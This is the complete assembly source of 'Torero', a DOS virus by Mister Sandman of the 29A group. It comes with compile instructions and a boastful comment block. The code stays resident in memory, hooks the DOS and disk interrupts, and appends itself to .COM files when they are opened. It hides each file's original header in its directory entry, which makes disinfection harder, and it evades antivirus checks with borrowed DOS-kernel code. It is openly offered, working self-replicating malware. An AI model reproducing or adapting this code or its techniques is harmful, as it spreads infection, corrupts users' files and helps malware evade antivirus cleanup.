;
;                                             ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;          Torero                             ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;          by Mister Sandman/29A               ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;                                             ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                             ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
; Hoho... here you have a new coolio viral technique, especially dedicated
; to those who think that everything on  viruses  was invented yet :) This
; virus ain't a 'powerful' one; in fact, and  as i decided  to do  in this
; first issue as i hadn't many  time, it's a simple  infector just written
; to show this new viral capability, never used before as far as i know.
;
; And what is this technique about?, you might ask. Ok... apart from DirII
; and all its family, we don't  know many viruses that  store the original
; header of infected files in other place than the viral code, right?
;
; AVV and i were making some researches and suddenly found ten free unused
; bytes on the directory entry of each file... and this the place where my
; virus stores the  header of every file it infects :) In this way, the AV
; companies  must write some specific  routines for disinfecting Torero...
; this  means that the cleaning  of our virus is  more difficult, which is
; what we're looking for :)
;
; Anyway, as every viral technique, it has  some pros and some cons... and
; the cons consist on the next simple thingy: if someone copies, compress-
; es, or manipulates an infected file, it  will have a different directory
; entry, and  then  it will  be imposible to restore its  original header.
;
; However, and as this is just a sample virus, i didn't pay much attention
; to this kinda probabilities, and i just used an idea Wintermute gave me:
; if the host doesn't find  its original header, it will display a message
; i'm sure you all know: 'This program requires Microsoft Windows.' :)
;
; As a last (but not least) feature  in this virus, don't forget to have a
; look at the infection  mark, based on using the eigth attribute bit, al-
; ways empty and unused until now. This is a specially good infection mark
; for a virus, as it's very simple and doesn't  get flagged because of in-
; correct  time  stamp and all  that shit. Besides, it makes things easier
; for us when implementing stealth techniques, etc.
;
; About  the  name, i decided  to call it 'Torero' because it's  a spanish
; word which means 'bullfighter', often  used  for telling someone that he
; or what he did is cool, because toreros are supposed to have the biggest
; nuts around :)
;
; Compiling instructions
;
; tasm /m torero.asm
; tlink torero.obj
; exe2bin torero.exe torero.com


                .286
torero          segment byte public
                assume  cs:torero,ds:torero
                org     0

torero_start    label   byte
torero_size     equ     torero_end-torero_start

torero_entry:   call    delta_offset                ; Get ë-offset in BP
delta_offset:   pop     bp                          ; for l8r use
                sub     bp,offset delta_offset

                mov     ah,30h                      ; Get DOS version
                int     21h

                cmp     bx,';)'                     ; Are we already
                jne     set_int_21h                 ; memory resident?

                push    cs                          ; Save CS for the host
                mov     bx,ds                       ; Don't lose DS
                xor     ax,ax                       ; Jump to the memory
                mov     ds,ax                       ; copy and restore
                push    word ptr ds:[21h*4+2]       ; the host header
                push    offset check_host
                mov     ds,bx
                retf

set_int_21h:    mov     ax,es
                dec     ax
                mov     ds,ax                       ; Program's MCB segment
                xor     di,di

                cmp     byte ptr ds:[di],'Y'        ; Is it a Z block?
                jna     set_int_21h

                sub     word ptr ds:[di+3],((torero_size/10h)+2)
                sub     word ptr ds:[di+12h],((torero_size/10h)+2)
                add     ax,word ptr ds:[di+3]
                inc     ax

                mov     ds,ax
                mov     byte ptr ds:[di],'Z'        ; Mark block as Z
                mov     word ptr ds:[di+1],8        ; System memory
                mov     word ptr ds:[di+3],((torero_size/10h)+1)
                mov     word ptr ds:[di+8],4f44h    ; Mark block as owned
                mov     word ptr ds:[di+0ah],0053h  ; by DOS (444f53h,0)
                inc     ax

                cld
                push    cs
                pop     ds
                mov     es,ax
                mov     cx,torero_size              ; Copy virus to memory
                mov     si,bp
                rep     movsb

                push    es
                push    offset copy_vector          ; Jump to the virus
                retf                                ; copy in memory

copy_vector:    push    ds
                mov     ds,cx
                mov     es,ax                       ; Save int 21h's
                mov     si,21h*4                    ; original vector
                lea     di,old_int_21h
                movsw
                movsw

                mov     word ptr [si-4],offset new_int_21h
                mov     word ptr [si-2],ax          ; Set ours

                mov     si,13h*4                    ; Save int 13h's
                lea     di,old_int_13h              ; original vector
                movsw
                movsw

                mov     word ptr [si-4],offset new_int_13h
                mov     word ptr [si-2],ax          ; Set ours

                mov     ds,ax
check_host:     call    open_host                   ; Open the host
                call    get_sft                     ; Get its SFT for our
                call    check_mark                  ; infection mark
                jb      messed_up                   ; File is messed up :-(

                call    read_entry                  ; Read the entry
                call    point_entry                 ; Point to the header
                cmp     word ptr ds:[si],0          ; Is it empty?
                jne     restore_header

                cmp     word ptr ds:[si+2],0        ; Empty too? huh :-(
                je      messed_up                   ; File is messed up

restore_header: pop     es                          ; ES=host segment
                push    es                          ; Store it in the stack
                mov     di,100h                     ; file header from the
                push    di                          ; Store the IP
                movsw                               ; DS:SI points to the
                movsb                               ; original header, in
                                                    ; the directory entry
                push    es
                pop     ds                          ; DS=ES
                retf                                ; Jump to the host

messed_up:      mov     ah,3eh                      ; File is messed up...
                int     21h                         ; close it and show
                call    emergency                   ; the Windows message :)

; ÄÄ´ Torero's int 13h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

new_int_13h:    cmp     ah,3
                je      sector_write                ; Sector write?

                db      0eah                        ; Jump back to the
old_int_13h     dw      ?,?                         ; original int 13h

sector_write:   push    ax bx cx
                pushf

                xor     ah,ah                       ; Calculate how many
                mov     cl,4                        ; files we must test
                shl     ax,cl                       ; by multiplying the
                mov     cx,ax                       ; sector number with
                or      cx,cx                       ; 10h (entries)
                je      bucle_end

int_13h_bucle:  cmp     byte ptr es:[bx+9],'O'      ; -O-?
                jne     more_files

                mov     al,byte ptr es:[bx+9]
                sub     al,2
                cmp     al,byte ptr es:[bx+0ah]     ; -OM?
                jne     more_files
                cmp     al,'M'                      ; Then it's a COM
                je      subtract

more_files:     add     bx,20h                      ; Look for more files
                loop    int_13h_bucle               ; Look'n'loop :)

bucle_end:      popf
                pop     cx bx ax                    ; End of the bucle
                                                    ; Call the original
                call    int_13h                     ; int 13h and jump
xor_and_jump:   xor     ax,ax                       ; to the original int

return_to_int:  push    bp ax
                pushf

                pop     ax                          ; Return to the
                mov     bp,sp                       ; original int 13h
                mov     word ptr ss:[bp+8],ax

                pop     ax bp
                retf    2

subtract:       cmp     byte ptr es:[bx],0e5h       ; A deleted file...
                je      more_files                  ; bah, skip it

                cmp     byte ptr es:[bx+0bh],80h    ; Infected?
                jb      more_files

                cmp     word ptr es:[bx+0ch],0      ; Is the header field
                jne     more_files                  ; empty?

                cmp     word ptr es:[bx+0eh],0
                jne     more_files

                mov     ax,word ptr cs:[header_store]   ; Ok, let's copy
                mov     word ptr es:[bx+0ch],ax         ; the original file
                                                        ; header to the
                mov     ax,word ptr cs:[header_store+2] ; directory entry
                mov     word ptr es:[bx+0eh],ax
                jmp     more_files

; ÄÄ´ Torero's signature ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

signature       db      0dh,0ah,'[Torero €:-) by Mister Sandman/29A]',0dh,0ah

; ÄÄ´ Torero's int 21h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

new_int_21h:    cli
                cmp     ah,6ch                      ; This code is stolen
                ja      real_checks                 ; from the original
                                                    ; DOS kernel handler,
                cmp     ah,33h                      ; so they won't catch
                jb      real_checks                 ; us if they don't go
                jz      fake_stuff                  ; further thru the
                                                    ; rest of the code of
                cmp     ah,64h                      ; the handler... thanx
                ja      fake_stuff                  ; to Qark for this
                jz      real_checks                 ; cool idea :)

                cmp     ah,51h
                jz      real_checks

                cmp     ah,62h
                jz      fake_stuff

                cmp     ah,50h
                jz      real_checks

fake_stuff:     push    ax bx cx                    ; Shit, shit, shit,
                nop                                 ; shit... skip it
                pop     cx bx ax

real_checks:    cmp     ah,30h
                jne     opening                     ; (get DOS version)?

                mov     bx,';)'                     ; Return the smiley :)
                iret

opening:        cmp     ah,3dh                      ; File opening?
                je      file_open

                cmp     ax,4301h                    ; Attribute change?
                je      new_attribute

                cmp     ax,6c00h                    ; Extended open?
                je      file_open

jmp_int_21h     db      0eah                        ; Jump to the original
old_int_21h     dw      ?,?                         ; int 21h address

; ÄÄ´ File open ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

file_open:      call    infect_file                 ; Infection routine
                jmp     dword ptr cs:[old_int_21h]  ; Jump back to int 21h

; ÄÄ´ New attribute ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

new_attribute:  mov     ah,30h                      ; Change 43h for 30h
                iret                                ; so it will do nothing

; ÄÄ´ Infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_file:    pushf
                push    ax bx cx dx                 ; Push registers, flags
                push    si di ds es                 ; and all that shit

                call    set_int_24h                 ; Set int 24h

                cmp     ah,6ch                      ; Extended open?
                jne     normal_open

                mov     dx,si                       ; Fix it to DS:DX
normal_open:    mov     ax,3d00h                    ; Open the file
                call    int_21h
                xchg    bx,ax                       ; File handle in BX

                push    cs                          ; CS=DS
                pop     ds

                call    get_sft                     ; Get file's SFT
                call    check_mark                  ; Already infected?
                jae     close_and_pop

                mov     byte ptr es:[di+2],2        ; Open mode=r/w
                mov     ax,word ptr es:[di+28h]     ; Check the extension
                cmp     ax,'OC'                     ; of our victim
                jne     close_and_pop

                mov     byte ptr cs:[infecting],1
                mov     ah,3fh                      ; Read the first three
                mov     cx,3                        ; bytes to our temporal
                lea     dx,header_store             ; header store
                call    int_21h

                mov     ax,word ptr es:[di+11h]     ; File lenght in AX
                cmp     ax,0ea60h                   ; Too big file?
                ja      close_and_pop

                push    ax                          ; Lseek to the end of
                call    lseek_end                   ; the file

                mov     ah,40h                      ; Append our k-r4d
                mov     cx,torero_size              ; code :)
                lea     dx,torero_start
                call    int_21h

                pop     ax                             ; Make the jmp to
                sub     ax,3                           ; our virus body
                mov     word ptr cs:[com_header+1],ax  ; for the new file
                call    set_marker

                call    lseek_start                 ; Lseek to the start

                mov     ah,40h                      ; Write the new header
                mov     cx,3                        ; in so we'll be always
                lea     dx,com_header               ; executed first ;P
                call    int_21h

                mov     ax,word ptr es:[di+11h]     ; Actual size in AX
                sub     ax,3                        ; Lseek to the position
                call    lseek_end                   ; of the original header

                mov     ah,40h                      ; Destroy all the info,
                mov     cx,3                        ; already stored in the
                lea     dx,garbage                  ; directory entry };)
                call    int_21h

close_and_pop:  mov     ah,3eh                      ; Close the file
                call    int_21h

                call    reset_int_24h               ; Reset int 24h

                pop     es ds di si                 ; And pop out all the
                pop     dx cx bx ax                 ; shit we pushed b4
                popf
                ret

; ÄÄ´ Call to the original int 13h ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

int_13h:        pushf
                call    dword ptr cs:[old_int_13h]  ; Call the original
                ret                                 ; int 13h

; ÄÄ´ Call to the original int 21h ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

int_21h:        pushf
                call    dword ptr cs:[old_int_21h]  ; Call the original
                ret                                 ; int 21h

; ÄÄ´ Get SFT in ES:DI ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_sft:        push    ax bx
                mov     ax,1220h                   ; Get job file table
                int     2fh                        ; in ES:DI (DOS 3+)
                jc      bad_sft

                xor     bx,bx                      ; Get the address of
                mov     ax,1216h                   ; the specific SFT for
                mov     bl,byte ptr es:[di]        ; our handle
                int     2fh

bad_sft:        pop     bx ax                      ; Pop registers and
                ret                                ; return to the code

; ÄÄ´ Check our infection mark ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_mark:     cmp     byte ptr es:[di+4],80h     ; Compare with the min.
                ret                                ; value of our mark

; ÄÄ´ Read the directory entry ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

read_entry:     push    ax bx cx
                call    parameters                 ; Load the sector
                int     25h

                pop     cx cx bx ax
                ret

; ÄÄ´ Sector loading ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

parameters:     mov     ax,word ptr es:[di+1bh]           ; Load the sector
                mov     word ptr cs:[control_block],ax    ; number in our
                mov     ax,word ptr es:[di+1dh]           ; control block
                mov     word ptr cs:[control_block+2],ax  ; Read a long
                mov     cx,0ffffh                         ; sector, 4 bytes

                push    cs                                ; CS=DS
                pop     ds

                mov     word ptr cs:[control_block+4],1   ; One sector
                mov     word ptr cs:[control_block+6],offset sector
                mov     word ptr cs:[control_block+8],cs
                lea     bx,control_block                  ; Control block

                push    ds si
                lds     si,dword ptr es:[di+7]            ; Point to the
                lodsb                                     ; DPB
                pop     si ds
                ret

; ÄÄ´ Point to the original header ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

point_entry:    mov     al,byte ptr es:[di+1fh]    ; Guess the entry
                xor     ah,ah

                push    cx
                mov     cl,5                       ; Multiply it*20h
                shl     ax,cl
                pop     cx

                lea     si,sector                  ; Calculate its offset
                add     si,ax                      ; into the sector and
                add     si,0ch                     ; move to si+0ch (header)
                ret

; ÄÄ´ Set int 24h ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

set_int_24h:    push    ax si di
                push    ds es

                xor     ax,ax                      ; Point to the IVT
                mov     ds,ax

                push    cs                         ; CS=ES
                pop     es

                mov     si,24h*4                   ; Save the original int
                mov     di,offset old_int_24h      ; 24h address and set
                cld                                ; ours l8r
                movsw
                movsw

                mov     word ptr [si-4],offset new_int_24h
                mov     word ptr [si-2],cs

                pop     es ds
                pop     di si ax
                ret

; ÄÄ´ Restore int 24h ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

reset_int_24h:  push    ax si di
                push    ds es

                xor     ax,ax                      ; Point to the IVT
                mov     es,ax

                push    cs                         ; CS=DS
                pop     ds

                mov     si,offset old_int_24h      ; Restore the original
                mov     di,24h*4                   ; int 24h address
                cld
                movsw
                movsw

                pop     es ds
                pop     di si ax
                ret

; ÄÄ´ Torero's int 24h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

new_int_24h:    mov     al,3                       ; Pass the error code
                iret

old_int_24h:    dw      ?,?                        ; Original int 24h

; ÄÄ´ Set our infection mark ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

set_marker:     mov     byte ptr es:[di+4],80h     ; Attribute bit 8
                ret

; ÄÄ´ Lseek to the start of the file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

lseek_start:    mov     word ptr es:[di+15h],0     ; Read pointer=0
                ret

; ÄÄ´ Lseek to the end of the file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

lseek_end:      mov     word ptr es:[di+15h],ax    ; Read pointer=file
                ret                                ; length (EOF)

; ÄÄ´ Open the host we're being executed from ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

open_host:      mov     ah,62h                     ; Get PSP address
                int     21h

                push    es
                mov     ds,bx
                mov     bx,word ptr ds:[2ch]       ; DS:2ch=PSP segment
                mov     es,bx
                xor     di,di

                mov     al,1                       ; Look for 01h (the
                mov     cx,0ffffh                  ; mark which sepparates
                repnz   scasb                      ; the path from the
                jnz     emergency                  ; name of the file that
                                                   ; is being executed)
                xor     al,al
                scasb

                push    es
                pop     ds es

                mov     ah,3dh                     ; Open the host
                mov     dx,di
                call    int_21h
                xchg    bx,ax                      ; Pass handle to BX
                ret                                ; and return

; ÄÄ´ Emergency routine... data lost! ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

emergency:      push    cs                         ; CS=DS
                pop     ds

                mov     ah,9                       ; Show the message...
                lea     dx,windows                 ; This programs requires
                int     21h                        ; Microsoft Windows

                mov     ax,4c01h                   ; Errorlevel=01 :)
                int     21h

; ÄÄ´ Data area ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

sector          db      200h dup (?)               ; The long sector

control_block   dd      ?                          ; Control block
                dw      ?
garbage         dd      ?
                db      ';)'

windows         db      'This program requires Microsoft Windows.'
                db      0dh,0ah,'$'

action          db      ?                          ; Reading or writing?
infecting       db      ?

com_header      db      0e9h,?,?                   ; The COM header
header_store    db      3 dup (?)                  ; Temporal header store

torero_end      label   byte

torero          ends
                end     torero_start
